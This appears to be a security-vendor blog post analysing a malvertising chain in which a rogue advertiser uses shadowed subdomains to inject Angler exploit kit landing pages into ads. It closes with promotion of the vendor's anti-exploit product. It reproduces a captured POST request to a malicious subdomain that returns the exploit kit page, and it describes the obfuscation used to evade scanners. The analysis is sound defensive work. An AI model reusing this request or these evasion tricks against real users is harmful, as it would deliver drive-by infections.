@@ -1,0 +1,62 @@
+Domain Shadowing With a Twist
+We’ve covered malvertising and exploits a fair amount on this blog and cyber criminals’ different techniques meant to evade detection and fuel the underground economy.
+Those familiar with exploit kits will know that the domains where they are hosted are very volatile, changing at a rapid pace and making blacklisting futile.
+Today, we are going to look at a malvertising attack that uses an advertiser’s platform as a “rotator”, a fancy word used to describe the process of providing constantly new malicious URLs.
+This technique is not new in itself. In fact, many compromised ad servers, especially those running vulnerable OpenX ad software, are often hacked by bad guys and leveraged to serve malware on-demand.
+Domain shadowing
+These attacks usually work hand in hand with rotation mechanisms such as fast-flux or in this case, domain shadowing, a method coined by Talos Group researchers at Cisco.
+Domain shadowing is a technique where attackers steal domain account credentials from their owners for the purpose of creating sub domains directed at malicious servers (reverse proxy).
+This gives criminals a huge amount of URLs they can cycle through and discard after use.
+The picture below shows what actually happens, from a network traffic point of view. The sub domain is used to grab a current and working exploit kit landing page.
+This architecture is efficient because it connects victims with malicious URLs that are served to them ‘on-demand’ in a completely automated fashion.
+By the time a security researcher looks at the URL, it is already long gone. The only thing of interest would be the IP address for the domain, as we can pinpoint which IP ranges exploit kits travel through.
+
+The case we are talking about today relies on sub domains to redirect to the Angler EK, but uses an interesting process to do so, making it look like the user is taken straight to the landing page instead.
+One stop shop rogue advertiser
+We found a Pay Per Click ad agency which has been around for a number of years and offers a platform where advertisers can load their creatives and get commissions each time someone clicks on their ad.
+But, one particular advertiser is abusing the service to side-load malicious URLs along with their ad. This is something that our Anti-Exploit technology immediately detected and blocked:
+
+The rogue advertiser is crafting a malicious iframe to an exploit kit landing page in real-time by feeding it dynamically into its source code. We will dissect how it does that in the following paragraphs.
+There is some slight obfuscation to hide the creation of the iframe itself, done by employing tricks such as string concatenation:
+
+More importantly, there is a POST request made to a sub domain (i.e. domain shadowing technique) to return the actual exploit kit landing URL.
+The URL of the sub domain at the time was low.djamedia.com/ladrien.html. Again, the bad guys are using JavaScript tricks to hide that URL from plain sight view.
+First, they build up an array:
+
+Then, they use multiple manipulation commands to craft that URL from the various strings contained in the vaiz array:
+
+If we print that nsg variable, we can confirm it holds the sub domain URL we mentioned previously:
+Now, onto the content that gets POSTed to this URL. Here is the snippet of code used to do so:
+
+It passes the following parameters (name,value):
+
+This is probably some form of authentication with the backend. We observed the name changing but the value has remained the same over time.
+The final POST request looks like this:
+POST http://low.djamedia.com/ladrien.html HTTP/1.1
+Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+Content-Length: 59
+Host: low.djamedia.com
+Pragma: no-cache
+5162370135=vj0ce2PBtBkwe77MvN05VvisKQnHMmHM2txAa2AQ8EA%253D
+The response from that POST request is a full html document containing the Angler EK landing page:
+
+It is digested and inserted on-the-fly into the ad page. (Note that the URL is different in the picture above and below because it had already changed between the time it was caught in the traffic capture and when we prepared the analysis for this blog.)
+
+A closer look at the iframe and Angler EK landing page URL, injected in real-time:
+
+While the page is loaded, it retrieves the link to a live Angler EK landing page from the subdomain and inserts it as an html document with the meta refresh code to load it automatically, all within that iframe tag.
+So the malvertising page basically merges those two steps into one, which for the user isn’t going to be any different, as the redirection to the exploit kit will happen anyway.
+There might be a reason for this approach. If we look carefully at the code, we can see that an iframe is dynamically created, but it does not contain the destination URL which is only added later on, as a separate html entity.
+This technique might confuse web scanners and enable the malicious redirection to go unnoticed. It certainly isn’t the typical flow we normally see with iframe injections.
+That Angler EK landing page (pictured below) is loaded via iframe, so the user will not even see it, but this is what it looks like if you open it on its own:
+
+The text on it is mainly used to confuse security scanners, while the actual malicious code is heavily obfuscated.
+Angler EK remains the most popular and sophisticated exploit kit in the wild. In addition to leveraging domain shadowing techniques to constantly evade blacklists it also has fileless infections capabilities and of course uses the latest vulnerabilities available.
+As we have seen, cyber criminals are constantly finding new ways to avoid detection. While it is interesting to study how they do it, and perhaps create signatures to counter their attacks, it simply does not work if we want to protect our users really well.
+This is why we have solutions like Anti-Exploit that work regardless of what the bad guys throw at us. With multiple layers of detection based on application behavior, we are able to defeat exploits proactively and don’t even need to engage into the daily cat-and-mouse game.
+If you would like to read more about domain shadowing, we recommend checking the Cisco blog article but also an earlier article from Dhia Mahjoub at OpenDNS. The latter provides good analysis on how GoDaddy accounts are hijacked to create sub domains.
